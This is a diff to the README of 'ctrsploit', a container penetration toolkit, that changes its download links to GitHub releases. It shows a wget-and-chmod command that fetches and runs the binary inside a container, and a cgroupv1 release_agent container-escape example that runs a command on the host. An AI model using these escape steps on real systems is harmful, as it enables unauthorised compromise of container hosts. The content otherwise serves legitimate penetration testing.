@@ -3,7 +3,7 @@
 ## Usage
 ### Help
 ```
-wget -O ctrsploit  && chmod +x ctrsploit
+wget -O ctrsploit https://github.com/ssst0n3/ctrsploit/releases/download/v0.1/ctrsploit_linux_amd64 && chmod +x ctrsploit
 ./ctrsploit --help
 NAME:
    ctrsploit - A penetration toolkit for container environment
@@ -47,7 +47,7 @@ OPTIONS:
 例如: 使用'cgroupv1-release_agent'技术逃逸:
 ```
 root@host # docker run -ti --rm --security-opt="seccomp=unconfined" --cap-add="sys_admin" busybox
-root@ctr # wget -O ctrsploit https://nebula-pentest-tools.obs.cn-south-1.myhuaweicloud.com/ctrsploit/ctrsploit_linux_amd64 && chmod +x ctrsploit
+root@ctr # wget -O ctrsploit https://github.com/ssst0n3/ctrsploit/releases/download/v0.1/ctrsploit_linux_amd64 && chmod +x ctrsploit
 root@ctr # ./ctrsploit e ra -c "cat /etc/hostname"
 ```
 
@@ -126,6 +126,7 @@ The host path of container's rootfs: /var/lib/docker/devicemapper/mnt/1659264e84
 ```
 
 ## Pre-Built Release
+https://github.com/ssst0n3/ctrsploit/releases
 
 ## Todo List
 - [ ] 环境探测
